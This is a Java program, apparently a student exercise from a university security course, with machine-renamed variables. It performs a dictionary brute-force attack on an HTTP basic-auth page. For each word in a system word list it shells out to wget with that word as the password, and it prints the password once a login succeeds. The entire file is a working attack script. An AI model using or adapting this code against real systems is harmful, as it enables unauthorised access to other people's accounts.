import java.io.*;
import java.*;
import java.util.StringTokenizer;
public class Dictionary {
    public static void main ( String v0[] ) {
        final String v1;
        v1 = "/usr/share/lib/dict/words";
        String v2;
        v2 = "http://sec-crack.cs.rmit.edu./SEC/2/";
        String v3;
        String v4;
        v4 = null;
        int v5;
        v5 = 0;
        try {
            BufferedReader v6;
            v6 = new BufferedReader ( new FileReader ( v1 ) );
            for ( ; ( v3 = v6.readLine() ) != null; ) {
                try {
                    Process v7;
                    v7 = Runtime.getRuntime().exec (
                             "wget --http-user= --http-passwd=" + v3 + " " + v2 );
                    BufferedReader v8;
                    v8 = new BufferedReader ( new InputStreamReader (
                                                  v7.getInputStream() ) );
                    BufferedReader v9;
                    v9 = new BufferedReader ( new InputStreamReader (
                                                  v7.getErrorStream() ) );
                    for ( ; ( v4 = v8.readLine() ) != null; ) {
                        System.out.println ( v4 );
                    }
                    for ( ; ( v4 = v9.readLine() ) != null; ) {
                        System.out.println ( v4 );
                    }
                    try {
                        v7.waitFor();
                    } catch ( InterruptedException v10 ) {
                    }
                    v5 = v5 + 1;
                    if ( ( v7.exitValue() ) == 0 ) {
                        System.out.println ( "**********PASSWORD IS: " + v3 );
                        System.out.println ( "**********NUMBER OF TRIES: " + v5 );
                        System.exit ( 1 );
                    }
                } catch ( IOException v11 ) {
                    System.out
                    .println ( "exception happened - here's what I know: " );
                    v11.printStackTrace();
                    System.exit ( -1 );
                }
            }
            System.out.println ( "DICTIONARY BRUTE FORCE UNABLE  FIND PASSWORD" );
            System.out.println ( "**********Sorry, password was not found in dictionary file" );
            System.exit ( 1 );
        } catch ( FileNotFoundException v12 ) {
            System.out.println ( v12 );
        } catch ( IOException v13 ) {
            System.out.println ( v13 );
        }
    }
}
